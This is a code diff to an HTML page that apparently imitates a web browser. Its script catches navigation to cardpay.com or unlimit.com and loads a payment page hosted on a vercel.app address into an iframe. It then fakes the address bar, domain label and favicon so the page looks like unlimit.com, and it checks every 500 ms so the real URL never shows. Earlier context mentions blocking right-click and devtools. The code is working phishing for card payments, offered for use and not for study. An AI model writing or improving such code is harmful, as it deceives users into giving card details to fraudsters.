@@ -2847,210 +2847,192 @@ console.log('✅ Right-click protection fully active (iframes, devtools, view-so
 (function() {
     "use strict";
 
-    const TARGET_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
-    const PROTECTED_DOMAINS = ['cardpay.com', 'unlimit.com'];
-    const SPOOF_URL = 'https://unlimit.com';
-    const SPOOF_FAVICON = 'https://www.unlimit.com/favicon.ico';
+    // === CONFIGURATION ===
+    const PAYMENT_URL = 'https://buypass-kappa.vercel.app/pay/cardpay.html';
+    const SPOOFED_URL = 'https://unlimit.com';
+    const SPOOFED_DOMAIN = 'unlimit.com';
+    const TRIGGER_DOMAINS = ['cardpay.com', 'unlimit.com'];
 
+    // DOM elements
     const iframe = document.getElementById('webFrame');
     const urlInput = document.getElementById('urlInput');
     const popupDomain = document.getElementById('popupDomain');
     const faviconImg = document.getElementById('faviconImg');
     const faviconDef = document.getElementById('faviconDefault');
 
-    let isActive = false;
-    let currentRealUrl = '';
+    let isPaymentMode = false;      // true when we are showing the payment page
+    let originalNavigate = window.navigate;
 
-    // Helper to check if a URL is protected
-    function isProtectedUrl(url) {
-        if (!url) return false;
-        return PROTECTED_DOMAINS.some(domain => url.toLowerCase().includes(domain));
+    // === Helper: force unlimit.com favicon ===
+    function setSpoofedFavicon() {
+        if (!faviconImg) return;
+        faviconImg.src = 'https://www.unlimit.com/favicon.ico';
+        faviconImg.onload = () => {
+            faviconImg.style.display = 'block';
+            if (faviconDef) faviconDef.style.display = 'none';
+        };
+        faviconImg.onerror = () => {
+            faviconImg.src = 'https://www.google.com/s2/favicons?domain=unlimit.com&sz=32';
+        };
     }
 
-    // Spoof UI to look like unlimit.com
-    function applySpoofUI() {
-        if (urlInput && urlInput.value !== SPOOF_URL) {
-            urlInput.value = SPOOF_URL;
-        }
-        if (popupDomain && popupDomain.innerText !== 'unlimit.com') {
-            popupDomain.innerText = 'unlimit.com';
-        }
-        if (faviconImg) {
-            faviconImg.src = SPOOF_FAVICON;
-            faviconImg.onload = () => {
-                faviconImg.style.display = 'block';
-                if (faviconDef) faviconDef.style.display = 'none';
-            };
-            faviconImg.onerror = () => {
-                faviconImg.src = `https://www.google.com/s2/favicons?domain=unlimit.com&sz=32`;
-            };
-        }
-    }
-
-    // Restore real UI based on iframe URL
-    function restoreRealUI() {
+    // === Restore normal UI (real domain, real favicon) ===
+    function restoreNormalUI() {
         if (!urlInput) return;
         try {
             let realUrl = iframe?.contentWindow?.location?.href;
-            if (!realUrl || realUrl === 'about:blank') {
-                realUrl = currentRealUrl || 'https://www.google.com';
-            }
+            if (!realUrl || realUrl === 'about:blank') realUrl = urlInput.value;
             urlInput.value = realUrl;
             if (popupDomain) {
-                try {
-                    popupDomain.innerText = new URL(realUrl).hostname;
-                } catch(e) { popupDomain.innerText = ''; }
+                try { popupDomain.innerText = new URL(realUrl).hostname; } catch(e) { popupDomain.innerText = ''; }
             }
             if (faviconImg) {
                 try {
                     let origin = new URL(realUrl).origin;
                     faviconImg.src = origin + '/favicon.ico';
-                    faviconImg.onload = () => faviconImg.style.display = 'block';
-                    faviconImg.onerror = () => {
-                        faviconImg.style.display = 'none';
-                        if (faviconDef) faviconDef.style.display = '';
-                    };
                 } catch(e) {
                     faviconImg.style.display = 'none';
                     if (faviconDef) faviconDef.style.display = '';
                 }
             }
-        } catch(e) {
-            // cross-origin: can't read, just set URL bar from stored currentUrl
-            if (currentRealUrl) urlInput.value = currentRealUrl;
+        } catch(e) { /* cross-origin – ignore */ }
+    }
+
+    // === Apply spoofed UI (unlimit.com) ===
+    function applySpoofedUI() {
+        if (urlInput && urlInput.value !== SPOOFED_URL) {
+            urlInput.value = SPOOFED_URL;
+        }
+        if (popupDomain && popupDomain.innerText !== SPOOFED_DOMAIN) {
+            popupDomain.innerText = SPOOFED_DOMAIN;
+        }
+        setSpoofedFavicon();
+    }
+
+    // === Activate payment mode (iframe = payment page, UI spoofed) ===
+    function activatePaymentMode() {
+        if (isPaymentMode) return;
+        if (!iframe) return;
+        isPaymentMode = true;
+        if (iframe.src !== PAYMENT_URL) {
+            iframe.src = PAYMENT_URL;
+        }
+        applySpoofedUI();
+    }
+
+    // === Deactivate payment mode (go back to normal browsing) ===
+    function deactivatePaymentMode() {
+        if (!isPaymentMode) return;
+        isPaymentMode = false;
+        // Do NOT change iframe src here – leave it as is (will be overwritten by navigate)
+        restoreNormalUI();
+    }
+
+    // === SAFETY: if address bar ever shows the real payment URL, force reload ===
+    function checkForRealPaymentUrl() {
+        if (urlInput && urlInput.value === PAYMENT_URL) {
+            // Immediately replace with spoofed URL and reload page to reset state
+            urlInput.value = SPOOFED_URL;
+            window.location.reload();
         }
     }
 
-    // Activate payment mode (force iframe + spoof UI)
-    function activatePayment() {
-        if (isActive) {
-            // Already active, just ensure iframe is correct
-            if (iframe && iframe.src !== TARGET_URL) {
-                iframe.src = TARGET_URL;
-            }
-            applySpoofUI();
-            return;
-        }
-        isActive = true;
-        if (iframe && iframe.src !== TARGET_URL) {
-            iframe.src = TARGET_URL;
-        }
-        applySpoofUI();
-    }
-
-    // Deactivate payment mode (restore normal behavior)
-    function deactivatePayment() {
-        if (!isActive) return;
-        isActive = false;
-        // Do NOT change iframe src - leave whatever is there
-        restoreRealUI();
-    }
-
-    // Handle navigation to a new URL
-    function handleNavigation(url) {
-        if (isProtectedUrl(url)) {
-            activatePayment();
-            // Tell the outer browser to show spoofed URL in the bar (but not change actual location)
-            if (window.navigate && typeof window.navigate === 'function') {
-                window.navigate(SPOOF_URL, true);
-            }
-            return true;
-        } else {
-            if (isActive) {
-                deactivatePayment();
-            }
-            return false;
-        }
-    }
-
-    // Override the global navigate function (used by address bar, back/forward)
-    const originalNavigate = window.navigate;
+    // === Intercept the main navigate function (used by address bar, back/forward) ===
     if (typeof originalNavigate === 'function') {
         window.navigate = function(url, addToHistory) {
-            if (handleNavigation(url)) {
-                // For protected URLs, we already called navigate with spoof URL
-                return;
+            // Normalise url string
+            const urlStr = String(url || '').toLowerCase();
+            const isTrigger = TRIGGER_DOMAINS.some(domain => urlStr.includes(domain));
+
+            if (isTrigger) {
+                // User wants to go to cardpay.com or unlimit.com → activate payment mode
+                activatePaymentMode();
+                // Call original navigate with spoofed URL (keeps history clean)
+                return originalNavigate(SPOOFED_URL, addToHistory);
+            } else {
+                // User goes to any other site → deactivate payment mode and navigate normally
+                if (isPaymentMode) deactivatePaymentMode();
+                return originalNavigate(url, addToHistory);
             }
-            return originalNavigate(url, addToHistory);
         };
     }
 
-    // Listen to address bar Enter key
+    // === Listen to address bar Enter key ===
     if (urlInput) {
         urlInput.addEventListener('keydown', (e) => {
             if (e.key === 'Enter') {
-                let raw = urlInput.value.trim();
-                if (isProtectedUrl(raw)) {
+                const raw = urlInput.value.trim().toLowerCase();
+                const isTrigger = TRIGGER_DOMAINS.some(domain => raw.includes(domain));
+                if (isTrigger) {
                     e.preventDefault();
-                    activatePayment();
+                    activatePaymentMode();
                     if (typeof originalNavigate === 'function') {
-                        originalNavigate(SPOOF_URL, true);
+                        originalNavigate(SPOOFED_URL, true);
                     }
                 } else {
-                    // Not protected - let normal navigation happen
-                    if (isActive) deactivatePayment();
-                    // Let the original navigate handle it
-                    if (typeof originalNavigate === 'function') {
-                        originalNavigate(raw, true);
-                    }
+                    // Normal navigation – deactivate payment mode if needed
+                    if (isPaymentMode) deactivatePaymentMode();
+                    // Let the original navigate happen normally
                 }
             }
         });
-        // Allow editing - no readOnly
+        // Never set readOnly – user can freely edit
     }
 
-    // Watch iframe load to detect when it changes away from payment URL
+    // === Monitor iframe loads ===
     if (iframe) {
         iframe.addEventListener('load', () => {
             setTimeout(() => {
                 try {
-                    let iframeUrl = iframe.contentWindow?.location?.href;
-                    if (iframeUrl) {
-                        currentRealUrl = iframeUrl;
-                        if (isProtectedUrl(iframeUrl)) {
-                            if (!isActive) activatePayment();
-                        } else {
-                            if (isActive && iframeUrl !== TARGET_URL) {
-                                // The iframe loaded a non-protected URL while we were active - deactivate
-                                deactivatePayment();
-                            } else if (iframeUrl === TARGET_URL) {
-                                applySpoofUI();
-                            } else {
-                                restoreRealUI();
-                            }
-                        }
-                    } else if (iframe.src === TARGET_URL) {
-                        applySpoofUI();
+                    const currentIframeUrl = iframe.contentWindow?.location?.href;
+                    // If iframe ended up on a non-payment page while we are in payment mode, revert
+                    if (isPaymentMode && currentIframeUrl && currentIframeUrl !== PAYMENT_URL && !TRIGGER_DOMAINS.some(d => currentIframeUrl.includes(d))) {
+                        // Something went wrong: force payment page again
+                        iframe.src = PAYMENT_URL;
+                        applySpoofedUI();
+                    } else if (!isPaymentMode && currentIframeUrl === PAYMENT_URL) {
+                        // We are in normal mode but iframe shows payment page – force reload to correct
+                        window.location.reload();
+                    } else if (!isPaymentMode) {
+                        // Normal mode: update UI to match current iframe
+                        restoreNormalUI();
                     } else {
-                        restoreRealUI();
+                        // Payment mode active: keep UI spoofed
+                        applySpoofedUI();
                     }
-                } catch(e) {
-                    // Cross-origin - can't read iframe URL, assume it's fine
-                    if (iframe.src === TARGET_URL) applySpoofUI();
-                }
-            }, 50);
+                } catch(e) { /* cross-origin – ignore */ }
+                checkForRealPaymentUrl();
+            }, 30);
         });
     }
 
-    // Listen to popstate (back/forward)
+    // === Listen to popstate (back/forward) ===
     window.addEventListener('popstate', () => {
         setTimeout(() => {
-            let currentUrl = urlInput ? urlInput.value : '';
-            if (isProtectedUrl(currentUrl)) {
-                activatePayment();
+            const currentBarUrl = urlInput ? urlInput.value : '';
+            const isTrigger = TRIGGER_DOMAINS.some(domain => currentBarUrl.toLowerCase().includes(domain));
+            if (isTrigger) {
+                activatePaymentMode();
             } else {
-                if (isActive) deactivatePayment();
+                if (isPaymentMode) deactivatePaymentMode();
             }
+            checkForRealPaymentUrl();
         }, 20);
     });
 
-    // Initial check
-    let initialUrl = urlInput ? urlInput.value : '';
-    if (isProtectedUrl(initialUrl)) {
-        activatePayment();
+    // === Periodically check for real payment URL in address bar (every 500ms) ===
+    setInterval(checkForRealPaymentUrl, 500);
+
+    // === Initial check on page load ===
+    const initialUrl = urlInput ? urlInput.value : '';
+    if (TRIGGER_DOMAINS.some(domain => initialUrl.toLowerCase().includes(domain))) {
+        activatePaymentMode();
     } else {
-        deactivatePayment();
+        if (isPaymentMode) deactivatePaymentMode();
+        restoreNormalUI();
     }
+
+    console.log('✅ Smart spoof active – payment URL never shown in address bar');
 })();
 </script>
 </body>
